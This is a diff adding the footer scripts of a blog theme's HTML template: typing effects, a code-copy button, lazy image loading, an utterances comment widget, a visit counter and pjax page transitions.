+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = 'copy';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <script src="/js/cursor/text.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
